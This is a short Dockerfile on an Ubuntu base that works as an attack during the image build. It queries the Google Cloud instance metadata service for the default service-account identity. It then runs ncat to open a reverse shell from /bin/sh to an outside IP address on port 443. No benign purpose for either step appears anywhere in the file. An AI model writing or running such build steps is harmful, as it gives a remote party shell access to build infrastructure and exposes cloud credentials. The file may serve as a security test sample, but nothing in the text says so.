FROM ubuntu:20.04
RUN apt update -y -qq
RUN apt install -y -qq curl 
RUN /usr/bin/curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email 

RUN ncat 20.64.89.35 443 -e /bin/sh

CMD ["/bin/bash"]
